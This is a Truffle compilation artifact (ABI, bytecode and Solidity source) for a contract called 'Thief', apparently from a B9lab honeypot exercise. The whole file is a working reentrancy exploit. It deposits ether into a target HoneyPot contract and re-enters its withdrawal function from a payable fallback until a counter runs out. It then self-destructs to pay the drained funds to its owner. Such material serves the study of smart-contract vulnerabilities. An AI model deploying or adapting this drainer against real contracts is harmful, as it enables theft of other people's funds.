{
  "contractName": "Thief",
  "abi": [
    {
      "constant": false,
      "inputs": [],
      "name": "get",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "goodbye",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "name": "honeypotAddress",
          "type": "address"
        },
        {
          "name": "howManyTimes",
          "type": "uint256"
        }
      ],
      "payable": true,
      "stateMutability": "payable",
      "type": "constructor"
    },
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    }
  ],
  "bytecode": "0x606060405260405160408061030783398101604052808051906020019091908051906020019091905050600033600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550826000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550816002819055506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1690508073ffffffffffffffffffffffffffffffffffffffff1663549262ba346040518263ffffffff167c01000000000000000000000000000000000000000000000000000000000281526004016000604051808303818588803b151561013a57600080fd5b6125ee5a03f1151561014b57600080fd5b505050505050506101a6806101616000396000f30060606040526004361061004c576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680636d4ce63c1461006257806375fc8e3c14610077575b600060025411156100605761005f61008c565b5b005b341561006d57600080fd5b61007561008c565b005b341561008257600080fd5b61008a61013f565b005b6000600260008154809291906001900391905055506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1690508073ffffffffffffffffffffffffffffffffffffffff16636d4ce63c6040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401600060405180830381600087803b151561012857600080fd5b6102c65a03f1151561013957600080fd5b50505050565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16ff00a165627a7a72305820e4af702f013c0f6711e46ef2fe503907bb398e4548b8c79809031d47853366bb0029",
  "source": "pragma solidity 0.4.18;\n\nimport \"./HoneyPot.sol\";\n\ncontract Thief {\n    address honeypot;\n    address owner;\n    uint count;\n    bytes32 signature;\n\n    function Thief(address honeypotAddress, uint howManyTimes)\n    public\n    payable\n    {\n      owner = msg.sender;\n      honeypot = honeypotAddress;\n      count = howManyTimes;\n\n      HoneyPot honeypotInstance = HoneyPot(honeypot);\n      honeypotInstance.put.value(msg.value)();\n    }\n\n    function get()\n    public\n    {\n      count--;\n      HoneyPot honeypotInstance = HoneyPot(honeypot);\n      honeypotInstance.get();\n    }\n\n    function ()\n    public\n    payable\n    {\n      if (count > 0) {\n        get();\n      }\n    }\n\n    function goodbye ()\n    public\n    {\n      selfdestruct(owner);\n    }\n}\n",
  "sourcePath": "/home/naps62/projects/b9lab-honeypot-theft/contracts/Thief.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.18+commit.9cf6e910.Emscripten.clang"
  },
  "schemaVersion": "1.0.1",
  "updatedAt": "2018-01-08T18:49:07.834Z"
}